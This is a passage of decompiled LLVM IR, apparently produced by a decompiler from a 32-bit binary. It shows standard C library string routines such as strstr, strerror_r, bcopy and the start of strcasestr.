dec_label_pc_1000f80c:                            ; preds = %dec_label_pc_1000f804, %dec_label_pc_1000f830
  %v0_1000f824 = phi i32 [ %v1_1000f830, %dec_label_pc_1000f830 ], [ %tmp, %dec_label_pc_1000f804 ]
  %v1_1000f80c = inttoptr i32 %v0_1000f824 to i8*
  %v2_1000f80c = load i8, i8* %v1_1000f80c, align 1
  %v3_1000f810 = icmp eq i8 %v2_1000f80c, 0
  br i1 %v3_1000f810, label %dec_label_pc_1000f818, label %dec_label_pc_1000f830

dec_label_pc_1000f818:                            ; preds = %dec_label_pc_1000f80c
  %v3_1000f818 = icmp ugt i32 %v0_1000f8b4, %v0_1000f824
  %v0_1000f824.v0_1000f8b4 = select i1 %v3_1000f818, i32 %v0_1000f824, i32 %v0_1000f8b4
  %v2_1000f828 = sub i32 %v0_1000f824.v0_1000f8b4, %tmp
  ret i32 %v2_1000f828

dec_label_pc_1000f830:                            ; preds = %dec_label_pc_1000f80c
  %v1_1000f830 = add i32 %v0_1000f824, 1
  %v1_1000f834 = urem i32 %v1_1000f830, 4
  %v3_1000f834 = icmp eq i32 %v1_1000f834, 0
  br i1 %v3_1000f834, label %dec_label_pc_1000f83c, label %dec_label_pc_1000f80c

dec_label_pc_1000f83c:                            ; preds = %dec_label_pc_1000f830, %dec_label_pc_1000f804
  %v0_1000f840 = phi i32 [ %tmp, %dec_label_pc_1000f804 ], [ %v1_1000f830, %dec_label_pc_1000f830 ]
  %v2_1000f8a83 = icmp ult i32 %v0_1000f840, %v0_1000f8b4
  br i1 %v2_1000f8a83, label %dec_label_pc_1000f84c, label %dec_label_pc_1000f8b0

dec_label_pc_1000f84c:                            ; preds = %dec_label_pc_1000f83c, %dec_label_pc_1000f8a4
  %v0_1000f7ec = phi i32 [ %v1_1000f850, %dec_label_pc_1000f8a4 ], [ %v0_1000f840, %dec_label_pc_1000f83c ]
  %v1_1000f84c = inttoptr i32 %v0_1000f7ec to i32*
  %v2_1000f84c = load i32, i32* %v1_1000f84c, align 4
  %v1_1000f850 = add i32 %v0_1000f7ec, 4
  %v1_1000f85c = add i32 %v2_1000f84c, -16843009
  %v2_1000f860 = and i32 %v1_1000f85c, -2139062144
  %v5_1000f860 = icmp eq i32 %v2_1000f860, 0
  %v1_1000f864 = add i32 %v0_1000f7ec, 1
  br i1 %v5_1000f860, label %dec_label_pc_1000f8a4, label %dec_label_pc_1000f86c

dec_label_pc_1000f86c:                            ; preds = %dec_label_pc_1000f84c
  %v2_1000f86c = inttoptr i32 %v0_1000f7ec to i8*
  %v3_1000f86c = load i8, i8* %v2_1000f86c, align 1
  %v3_1000f870 = icmp eq i8 %v3_1000f86c, 0
  br i1 %v3_1000f870, label %dec_label_pc_1000f7ec, label %dec_label_pc_1000f878

dec_label_pc_1000f878:                            ; preds = %dec_label_pc_1000f86c
  %v2_1000f878 = inttoptr i32 %v1_1000f864 to i8*
  %v3_1000f878 = load i8, i8* %v2_1000f878, align 1
  %v3_1000f87c = icmp eq i8 %v3_1000f878, 0
  br i1 %v3_1000f87c, label %dec_label_pc_1000f8b0, label %dec_label_pc_1000f884

dec_label_pc_1000f884:                            ; preds = %dec_label_pc_1000f878
  %v1_1000f884 = add i32 %v0_1000f7ec, 2
  %v2_1000f884 = inttoptr i32 %v1_1000f884 to i8*
  %v3_1000f884 = load i8, i8* %v2_1000f884, align 1
  %v3_1000f88c = icmp eq i8 %v3_1000f884, 0
  br i1 %v3_1000f88c, label %dec_label_pc_1000f8b0, label %dec_label_pc_1000f894

dec_label_pc_1000f894:                            ; preds = %dec_label_pc_1000f884
  %v1_1000f894 = add i32 %v0_1000f7ec, 3
  %v2_1000f894 = inttoptr i32 %v1_1000f894 to i8*
  %v3_1000f894 = load i8, i8* %v2_1000f894, align 1
  %v3_1000f89c = icmp eq i8 %v3_1000f894, 0
  br i1 %v3_1000f89c, label %dec_label_pc_1000f8b0, label %dec_label_pc_1000f8a4

dec_label_pc_1000f8a4:                            ; preds = %dec_label_pc_1000f894, %dec_label_pc_1000f84c
  %v2_1000f8a8 = icmp ult i32 %v1_1000f850, %v0_1000f8b4
  br i1 %v2_1000f8a8, label %dec_label_pc_1000f84c, label %dec_label_pc_1000f8b0

dec_label_pc_1000f8b0:                            ; preds = %dec_label_pc_1000f8a4, %dec_label_pc_1000f878, %dec_label_pc_1000f884, %dec_label_pc_1000f894, %dec_label_pc_1000f83c, %dec_label_pc_1000f7ec
  %v0_1000f8bc = phi i32 [ %v0_1000f7ec, %dec_label_pc_1000f7ec ], [ %v0_1000f840, %dec_label_pc_1000f83c ], [ %v1_1000f894, %dec_label_pc_1000f894 ], [ %v1_1000f884, %dec_label_pc_1000f884 ], [ %v1_1000f864, %dec_label_pc_1000f878 ], [ %v0_1000f8b4, %dec_label_pc_1000f8a4 ]
  %v3_1000f8b0 = icmp ugt i32 %v0_1000f8b4, %v0_1000f8bc
  %v0_1000f8bc.v0_1000f8b4 = select i1 %v3_1000f8b0, i32 %v0_1000f8bc, i32 %v0_1000f8b4
  %v2_1000f8c0 = sub i32 %v0_1000f8bc.v0_1000f8b4, %tmp
  ret i32 %v2_1000f8c0

; uselistorder directives
  uselistorder i32 %v1_1000f850, { 1, 0 }
  uselistorder i32 %v0_1000f7ec, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v0_1000f840, { 1, 0, 2 }
  uselistorder i32 %v1_1000f830, { 1, 0, 2 }
  uselistorder i32 %v0_1000f824, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000f8b4, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000f7f4, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_1000f8b0, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000f84c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f80c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f804, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_1000f8c8 = load i8, i8* %arg2, align 1
  %v4_1000f8c8 = zext i8 %v3_1000f8c8 to i32
  store i32 %v4_1000f8c8, i32* %r6.global-to-local, align 4
  %v3_1000f8cc = icmp eq i8 %v3_1000f8c8, 0
  %v0_1000f8d0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f8cc, i32 %v0_1000f8d0)
  %v1_1000f8d4 = add i32 %arg1, -1
  store i32 %v1_1000f8d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f8d8

dec_label_pc_1000f8d8:                            ; preds = %dec_label_pc_1000f8e8, %entry
  %v0_1000f8d8 = phi i32 [ %v1_1000f8d8, %dec_label_pc_1000f8e8 ], [ %v1_1000f8d4, %entry ]
  %v1_1000f8d8 = add i32 %v0_1000f8d8, 1
  %v2_1000f8d8 = inttoptr i32 %v1_1000f8d8 to i8*
  %v3_1000f8d8 = load i8, i8* %v2_1000f8d8, align 1
  store i32 %v1_1000f8d8, i32* %r3.global-to-local, align 4
  %v3_1000f8dc = icmp eq i8 %v3_1000f8d8, 0
  br i1 %v3_1000f8dc, label %dec_label_pc_1000f9b4, label %dec_label_pc_1000f8e8

dec_label_pc_1000f8e8:                            ; preds = %dec_label_pc_1000f8d8
  %v4_1000f8e0 = icmp eq i8 %v3_1000f8d8, %v3_1000f8c8
  br i1 %v4_1000f8e0, label %dec_label_pc_1000f8ec, label %dec_label_pc_1000f8d8

dec_label_pc_1000f8ec:                            ; preds = %dec_label_pc_1000f8e8
  %v2_1000f8ec = add i32 %tmp, 1
  %v3_1000f8ec = inttoptr i32 %v2_1000f8ec to i8*
  %v4_1000f8ec = load i8, i8* %v3_1000f8ec, align 1
  %v5_1000f8ec = zext i8 %v4_1000f8ec to i32
  store i32 %v5_1000f8ec, i32* %r5.global-to-local, align 4
  store i32 %v2_1000f8ec, i32* %r4.global-to-local, align 4
  %v3_1000f8f4 = icmp eq i8 %v4_1000f8ec, 0
  %v0_1000f8f8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f8f4, i32 %v0_1000f8f8)
  %v0_1000f8fc.sink.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f940

dec_label_pc_1000f908:                            ; preds = %dec_label_pc_1000f9a8
  %v3_1000f908 = load i8, i8* %storemerge4.in.in, align 1
  %v4_1000f908 = zext i8 %v3_1000f908 to i32
  store i32 %v1_1000f8fc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f930.preheader

dec_label_pc_1000f930.preheader:                  ; preds = %dec_label_pc_1000f908, %dec_label_pc_1000f940
  %v0_1000f93017 = phi i32 [ %v4_1000f908, %dec_label_pc_1000f908 ], [ %storemerge4, %dec_label_pc_1000f940 ]
  %v1_1000f930.pre = load i32, i32* %r6.global-to-local, align 4
  %v4_1000f93025 = icmp eq i32 %v0_1000f93017, %v1_1000f930.pre
  %v3_1000f93427 = icmp eq i32 %v0_1000f93017, 0
  br i1 %v4_1000f93025, label %dec_label_pc_1000f940, label %dec_label_pc_1000f914

dec_label_pc_1000f914:                            ; preds = %dec_label_pc_1000f930.preheader, %dec_label_pc_1000f92c
  %v3_1000f93429 = phi i1 [ %v3_1000f934, %dec_label_pc_1000f92c ], [ %v3_1000f93427, %dec_label_pc_1000f930.preheader ]
  %v0_1000f91828 = phi i32 [ %v1_1000f92c, %dec_label_pc_1000f92c ], [ %v1_1000f8fc, %dec_label_pc_1000f930.preheader ]
  br i1 %v3_1000f93429, label %dec_label_pc_1000f9b4, label %dec_label_pc_1000f918

dec_label_pc_1000f918:                            ; preds = %dec_label_pc_1000f914
  %v1_1000f918 = add i32 %v0_1000f91828, 1
  %v2_1000f918 = inttoptr i32 %v1_1000f918 to i8*
  %v3_1000f918 = load i8, i8* %v2_1000f918, align 1
  %v4_1000f918 = zext i8 %v3_1000f918 to i32
  store i32 %v1_1000f918, i32* %r11.global-to-local, align 4
  %v4_1000f91c = icmp eq i32 %v4_1000f918, %v1_1000f930.pre
  br i1 %v4_1000f91c, label %dec_label_pc_1000f940, label %dec_label_pc_1000f928

dec_label_pc_1000f928:                            ; preds = %dec_label_pc_1000f918
  %v3_1000f920 = icmp eq i8 %v3_1000f918, 0
  br i1 %v3_1000f920, label %dec_label_pc_1000f9b4, label %dec_label_pc_1000f92c

dec_label_pc_1000f92c:                            ; preds = %dec_label_pc_1000f928
  %v1_1000f92c = add i32 %v0_1000f91828, 2
  %v2_1000f92c = inttoptr i32 %v1_1000f92c to i8*
  %v3_1000f92c = load i8, i8* %v2_1000f92c, align 1
  %v4_1000f92c = zext i8 %v3_1000f92c to i32
  store i32 %v1_1000f92c, i32* %r11.global-to-local, align 4
  %v4_1000f930 = icmp eq i32 %v4_1000f92c, %v1_1000f930.pre
  %v3_1000f934 = icmp eq i8 %v3_1000f92c, 0
  br i1 %v4_1000f930, label %dec_label_pc_1000f940, label %dec_label_pc_1000f914

dec_label_pc_1000f940:                            ; preds = %dec_label_pc_1000f930.preheader, %dec_label_pc_1000f92c, %dec_label_pc_1000f918, %dec_label_pc_1000f8ec
  %v0_1000f8fc.sink = phi i32 [ %v0_1000f8fc.sink.pre, %dec_label_pc_1000f8ec ], [ %v1_1000f8fc, %dec_label_pc_1000f930.preheader ], [ %v1_1000f92c, %dec_label_pc_1000f92c ], [ %v1_1000f918, %dec_label_pc_1000f918 ]
  %v1_1000f8fc = add i32 %v0_1000f8fc.sink, 1
  %storemerge4.in.in = inttoptr i32 %v1_1000f8fc to i8*
  %storemerge4.in = load i8, i8* %storemerge4.in.in, align 1
  %storemerge4 = zext i8 %storemerge4.in to i32
  store i32 %v1_1000f8fc, i32* %r11.global-to-local, align 4
  %v1_1000f940 = load i32, i32* %r5.global-to-local, align 4
  %v4_1000f940 = icmp eq i32 %storemerge4, %v1_1000f940
  br i1 %v4_1000f940, label %dec_label_pc_1000f948, label %dec_label_pc_1000f930.preheader

dec_label_pc_1000f948:                            ; preds = %dec_label_pc_1000f940
  %v1_1000f948 = add i32 %v0_1000f8fc.sink, 2
  %v2_1000f948 = inttoptr i32 %v1_1000f948 to i8*
  %v3_1000f948 = load i8, i8* %v2_1000f948, align 1
  %v4_1000f948 = zext i8 %v3_1000f948 to i32
  store i32 %v4_1000f948, i32* %r10.global-to-local, align 4
  store i32 %v0_1000f8fc.sink, i32* %r3.global-to-local, align 4
  %v0_1000f950 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f950 = add i32 %v0_1000f950, 1
  %v2_1000f950 = inttoptr i32 %v1_1000f950 to i8*
  %v3_1000f950 = load i8, i8* %v2_1000f950, align 1
  %v4_1000f950 = zext i8 %v3_1000f950 to i32
  store i32 %v1_1000f950, i32* %r8.global-to-local, align 4
  store i32 %v1_1000f948, i32* %r11.global-to-local, align 4
  %v4_1000f95c = icmp eq i8 %v3_1000f948, %v3_1000f950
  br i1 %v4_1000f95c, label %dec_label_pc_1000f964, label %dec_label_pc_1000f9a8

dec_label_pc_1000f964:                            ; preds = %dec_label_pc_1000f948, %dec_label_pc_1000f990.dec_label_pc_1000f964_crit_edge
  %v0_1000f96c = phi i32 [ %v0_1000f96c.pre, %dec_label_pc_1000f990.dec_label_pc_1000f964_crit_edge ], [ %v1_1000f950, %dec_label_pc_1000f948 ]
  %v0_1000f968 = phi i32 [ %v0_1000f968.pre, %dec_label_pc_1000f990.dec_label_pc_1000f964_crit_edge ], [ %v1_1000f948, %dec_label_pc_1000f948 ]
  %v0_1000f964 = phi i32 [ %v4_1000f994, %dec_label_pc_1000f990.dec_label_pc_1000f964_crit_edge ], [ %v4_1000f948, %dec_label_pc_1000f948 ]
  %v3_1000f964 = icmp eq i32 %v0_1000f964, 0
  %v1_1000f968 = add i32 %v0_1000f968, 1
  store i32 %v1_1000f968, i32* %r7.global-to-local, align 4
  %v1_1000f96c = add i32 %v0_1000f96c, 1
  store i32 %v1_1000f96c, i32* %r10.global-to-local, align 4
  %v0_1000f970 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f964, i32 %v0_1000f970)
  %v0_1000f974 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f974 = add i32 %v0_1000f974, 1
  %v2_1000f974 = inttoptr i32 %v1_1000f974 to i8*
  %v3_1000f974 = load i8, i8* %v2_1000f974, align 1
  %v4_1000f974 = zext i8 %v3_1000f974 to i32
  %v0_1000f978 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f978 = add i32 %v0_1000f978, 1
  store i32 %v1_1000f978, i32* %r8.global-to-local, align 4
  %v0_1000f97c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f97c = add i32 %v0_1000f97c, 1
  %v2_1000f97c = inttoptr i32 %v1_1000f97c to i8*
  %v3_1000f97c = load i8, i8* %v2_1000f97c, align 1
  %v0_1000f980 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000f980 = add i32 %v0_1000f980, 1
  store i32 %v1_1000f980, i32* %r11.global-to-local, align 4
  %v4_1000f988 = icmp eq i8 %v3_1000f97c, %v3_1000f974
  br i1 %v4_1000f988, label %dec_label_pc_1000f990, label %dec_label_pc_1000f9a8

dec_label_pc_1000f990:                            ; preds = %dec_label_pc_1000f964
  %v3_1000f984 = icmp eq i8 %v3_1000f974, 0
  %v0_1000f990 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f984, i32 %v0_1000f990)
  %v0_1000f994 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f994 = add i32 %v0_1000f994, 1
  %v2_1000f994 = inttoptr i32 %v1_1000f994 to i8*
  %v3_1000f994 = load i8, i8* %v2_1000f994, align 1
  %v4_1000f994 = zext i8 %v3_1000f994 to i32
  %v0_1000f998 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000f998 = add i32 %v0_1000f998, 1
  %v2_1000f998 = inttoptr i32 %v1_1000f998 to i8*
  %v3_1000f998 = load i8, i8* %v2_1000f998, align 1
  store i32 %v4_1000f994, i32* %r10.global-to-local, align 4
  %v4_1000f9a0 = icmp eq i8 %v3_1000f998, %v3_1000f994
  br i1 %v4_1000f9a0, label %dec_label_pc_1000f990.dec_label_pc_1000f964_crit_edge, label %dec_label_pc_1000f9a8

dec_label_pc_1000f990.dec_label_pc_1000f964_crit_edge: ; preds = %dec_label_pc_1000f990
  %v0_1000f968.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000f96c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f964

dec_label_pc_1000f9a8:                            ; preds = %dec_label_pc_1000f990, %dec_label_pc_1000f964, %dec_label_pc_1000f948
  %v0_1000f9a8 = phi i32 [ %v4_1000f950, %dec_label_pc_1000f948 ], [ %v4_1000f994, %dec_label_pc_1000f990 ], [ %v4_1000f974, %dec_label_pc_1000f964 ]
  %v3_1000f9a8 = icmp eq i32 %v0_1000f9a8, 0
  br i1 %v3_1000f9a8, label %dec_label_pc_1000f9b0, label %dec_label_pc_1000f908

dec_label_pc_1000f9b0:                            ; preds = %dec_label_pc_1000f9a8
  ret i32 %v0_1000f8fc.sink

dec_label_pc_1000f9b4:                            ; preds = %dec_label_pc_1000f8d8, %dec_label_pc_1000f928, %dec_label_pc_1000f914
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1000f994, { 0, 2, 1 }
  uselistorder i8 %v3_1000f974, { 1, 0, 2 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i8* %storemerge4.in.in, { 1, 0 }
  uselistorder i32 %v1_1000f8fc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1000f8fc.sink, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000f92c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000f91828, { 1, 0 }
  uselistorder i32 %v1_1000f930.pre, { 1, 2, 0 }
  uselistorder i32 %v1_1000f8d8, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000f9b4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f964, { 1, 0 }
  uselistorder label %dec_label_pc_1000f940, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000f914, { 1, 0 }
  uselistorder label %dec_label_pc_1000f930.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268499412, i32* @lr, align 4
  %v0_1000f9d0 = call i32 @__xpg_strerror_r()
  %v0_1000f9d8 = load i32, i32* @r29, align 4
  ret i32 %v0_1000f9d8
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1000f9ec = load i32, i32* @r3, align 4
  %v2_1000f9ec = icmp ugt i32 %v0_1000f9ec, 124
  %v0_1000f9fc = load i32, i32* @r4, align 4
  store i32 %v0_1000f9fc, i32* %r27.global-to-local, align 4
  %v0_1000fa04 = load i32, i32* @r5, align 4
  br i1 %v2_1000f9ec, label %dec_label_pc_1000fa48, label %dec_label_pc_1000fa0c

dec_label_pc_1000fa0c:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1001b33c.1061 to i32), i32* %r30.global-to-local, align 4
  %v3_1000fa287 = icmp eq i32 %v0_1000f9ec, 0
  br i1 %v3_1000fa287, label %dec_label_pc_1000fa3c, label %dec_label_pc_1000fa1c

dec_label_pc_1000fa1c:                            ; preds = %dec_label_pc_1000fa0c, %dec_label_pc_1000fa1c
  %v0_1000fa20 = phi i32 [ %v1_1000fa20, %dec_label_pc_1000fa1c ], [ ptrtoint ([8 x i8]* @global_var_1001b33c.1061 to i32), %dec_label_pc_1000fa0c ]
  %v1_1000fa20 = add i32 %v0_1000fa20, 1
  store i32 %v1_1000fa20, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000fa1c

dec_label_pc_1000fa3c:                            ; preds = %dec_label_pc_1000fa0c
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000fa7c

dec_label_pc_1000fa48:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1000f9ec, 0
  %v1_1000fa4c = zext i1 %tmp to i32
  %v2_1000fa4c = ashr i32 %v0_1000f9ec, 31
  %v3_1000fa4c = and i32 %v2_1000fa4c, -2
  %v4_1000fa4c = or i32 %v3_1000fa4c, %v1_1000fa4c
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1000fa60 = bitcast i32* %stack_var_-39 to i8*
  %v6_1000fa60 = call i32 @_uintmaxtostr(i8* %v5_1000fa60, i32 %v4_1000fa4c, i32 %v0_1000f9ec, i32 -10, i32 0)
  %v1_1000fa68 = add i32 %v6_1000fa60, -14
  store i32 %v1_1000fa68, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1001b32c.1062 to i32), i32* @r4, align 4
  store i32 %v1_1000fa68, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268499580, i32* @lr, align 4
  %v0_1000fa78 = call i32 @memcpy()
  %v0_1000fa7c.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1000fa80.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000fa90.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000fa7c

dec_label_pc_1000fa7c:                            ; preds = %dec_label_pc_1000fa3c, %dec_label_pc_1000fa48
  %v0_1000fa90 = phi i32 [ %v0_1000fa04, %dec_label_pc_1000fa3c ], [ %v0_1000fa90.pre, %dec_label_pc_1000fa48 ]
  %v0_1000fa80 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1001b33c.1061 to i32), %dec_label_pc_1000fa3c ], [ %v0_1000fa80.pre, %dec_label_pc_1000fa48 ]
  %v1_1000fa84 = phi i32 [ %v0_1000f9fc, %dec_label_pc_1000fa3c ], [ %v0_1000fa7c.pre, %dec_label_pc_1000fa48 ]
  %tmp19 = icmp slt i32 %v1_1000fa84, 0
  %v1_1000fa7c = zext i1 %tmp19 to i32
  %v2_1000fa7c = ashr i32 %v1_1000fa84, 31
  %v3_1000fa7c = and i32 %v2_1000fa7c, -2
  %v4_1000fa7c = or i32 %v3_1000fa7c, %v1_1000fa7c
  store i32 %v0_1000fa80, i32* @r3, align 4
  %v2_1000fa84 = xor i32 %v4_1000fa7c, %v1_1000fa84
  %v2_1000fa88 = sub i32 %v4_1000fa7c, %v2_1000fa84
  %tmp20 = icmp slt i32 %v2_1000fa88, 0
  %v1_1000fa8c = zext i1 %tmp20 to i32
  %v2_1000fa8c = ashr i32 %v2_1000fa88, 31
  %v3_1000fa8c = and i32 %v2_1000fa8c, -2
  %v4_1000fa8c = or i32 %v3_1000fa8c, %v1_1000fa8c
  %v2_1000fa90 = and i32 %v4_1000fa8c, %v0_1000fa90
  store i32 %v2_1000fa90, i32* @r29, align 4
  %v0_1000fa94 = call i32 @__GI_strlen()
  %v1_1000fa98 = add i32 %v0_1000fa94, 1
  store i32 %v1_1000fa98, i32* %r31.global-to-local, align 4
  %v1_1000fa9c = load i32, i32* @r29, align 4
  %v3_1000fa9c = icmp ugt i32 %v1_1000fa98, %v1_1000fa9c
  br i1 %v3_1000fa9c, label %dec_label_pc_1000faa4, label %dec_label_pc_1000faac

dec_label_pc_1000faa4:                            ; preds = %dec_label_pc_1000fa7c
  store i32 %v1_1000fa9c, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000faac

dec_label_pc_1000faac:                            ; preds = %dec_label_pc_1000fa7c, %dec_label_pc_1000faa4
  %v0_1000fabc = phi i32 [ %v1_1000fa9c, %dec_label_pc_1000faa4 ], [ %v1_1000fa98, %dec_label_pc_1000fa7c ]
  %v3_1000faac = icmp eq i32 %v0_1000fabc, 0
  br i1 %v3_1000faac, label %dec_label_pc_1000fad0, label %dec_label_pc_1000fab4

dec_label_pc_1000fab4:                            ; preds = %dec_label_pc_1000faac
  %v0_1000fab4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000fab4, i32* @r4, align 4
  %v0_1000fab8 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000fab8, i32* @r3, align 4
  store i32 %v0_1000fabc, i32* @r5, align 4
  store i32 268499652, i32* @lr, align 4
  %v0_1000fac0 = call i32 @memcpy()
  %v1_1000fac4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fac4 = add i32 %v1_1000fac4, %v0_1000fab8
  %v3_1000facc = add i32 %v2_1000fac4, -1
  %v4_1000facc = inttoptr i32 %v3_1000facc to i8*
  store i8 0, i8* %v4_1000facc, align 1
  br label %dec_label_pc_1000fad0

dec_label_pc_1000fad0:                            ; preds = %dec_label_pc_1000faac, %dec_label_pc_1000fab4
  %v0_1000fad0 = load i32, i32* %r28.global-to-local, align 4
  %v3_1000fad0 = icmp eq i32 %v0_1000fad0, 0
  br i1 %v3_1000fad0, label %dec_label_pc_1000fae0, label %dec_label_pc_1000fad8

dec_label_pc_1000fad8:                            ; preds = %dec_label_pc_1000fad0
  %v0_1000fad8 = call i32 @__errno_location()
  %v0_1000fadc = load i32, i32* %r28.global-to-local, align 4
  %v2_1000fadc = inttoptr i32 %v0_1000fad8 to i32*
  store i32 %v0_1000fadc, i32* %v2_1000fadc, align 4
  %v0_1000fae4.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000fae0

dec_label_pc_1000fae0:                            ; preds = %dec_label_pc_1000fad0, %dec_label_pc_1000fad8
  %v0_1000fae4 = phi i32 [ 0, %dec_label_pc_1000fad0 ], [ %v0_1000fae4.pre, %dec_label_pc_1000fad8 ]
  ret i32 %v0_1000fae4

; uselistorder directives
  uselistorder i32 %v2_1000fa88, { 1, 0 }
  uselistorder i32 %v4_1000fa7c, { 1, 0 }
  uselistorder i32 %v1_1000fa84, { 1, 2, 0 }
  uselistorder i32 %v1_1000fa20, { 1, 0 }
  uselistorder i32 %v0_1000f9ec, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1001b33c.1061 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000fae0, { 1, 0 }
  uselistorder label %dec_label_pc_1000fad0, { 1, 0 }
  uselistorder label %dec_label_pc_1000faac, { 1, 0 }
  uselistorder label %dec_label_pc_1000fa7c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fa1c, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000fb04 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000fb04
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v3_1000fb10 = load i32, i32* bitcast (i32** @global_var_1002c8dc.1064 to i32*), align 4
  store i32 %v3_1000fb10, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000fb18

dec_label_pc_1000fb18:                            ; preds = %dec_label_pc_1000fb18.backedge, %entry
  %v0_1000fb18 = phi i32 [ %v0_1000fb18.pre, %dec_label_pc_1000fb18.backedge ], [ %arg2, %entry ]
  %v1_1000fb18 = inttoptr i32 %v0_1000fb18 to i8*
  %v2_1000fb18 = load i8, i8* %v1_1000fb18, align 1
  %v3_1000fb18 = zext i8 %v2_1000fb18 to i32
  store i32 %v3_1000fb18, i32* %r0.global-to-local, align 4
  %v1_1000fb1c = add i32 %v0_1000fb18, 1
  store i32 %v1_1000fb1c, i32* %r10.global-to-local, align 4
  %v3_1000fb20 = icmp eq i8 %v2_1000fb18, 0
  %v1_1000fb24 = mul nuw nsw i32 %v3_1000fb18, 2
  store i32 %v1_1000fb24, i32* %r9.global-to-local, align 4
  %v0_1000fb28 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000fb20, i32 %v0_1000fb28)
